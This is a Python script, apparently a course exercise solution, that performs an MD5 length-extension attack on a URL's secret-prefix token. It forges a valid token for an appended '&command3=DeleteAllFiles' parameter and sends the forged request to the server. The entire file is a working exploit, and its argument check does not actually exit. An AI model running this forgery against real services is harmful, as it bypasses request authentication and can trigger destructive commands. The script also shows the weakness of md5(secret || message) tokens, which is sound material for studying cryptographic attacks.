import http.client 
import urllib 
import sys
import pymd5

if len(sys.argv) != 2:
    print('Requires the URL to extend as a command line argument.') #exit(1)

original_url = sys.argv[1]

prehash = original_url[:original_url.find("?")+1]
original_token = original_url[original_url.find("=")+1:original_url.find("&")]
original_query = original_url[original_url.find("&")+1:]
malicious_extension = '&command3=DeleteAllFiles'
malicious_extensionB = b'&command3=DeleteAllFiles'
print("prehash: " , prehash)
print("original_token: " , original_token)
print("original_query: " ,original_query)

original_message_length = len(original_query) + 8
message_padding = pymd5.padding(original_message_length * 8)
total_message_length = (original_message_length + len(message_padding)) * 8

h = pymd5.md5(state=bytes.fromhex(original_token), count=total_message_length)
h.update(malicious_extensionB)

updated_token = h.hexdigest()
url_safe_padding = urllib.parse.quote(message_padding)

new_url = 'token={}&{}{}{}'.format(updated_token, original_query, url_safe_padding, malicious_extension)
new_url = prehash + new_url
print(new_url)

# The following code requests the URL and returns the response from the server
parsed_url = urllib.parse.urlparse(new_url)
conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query)
print(conn.getresponse().read())

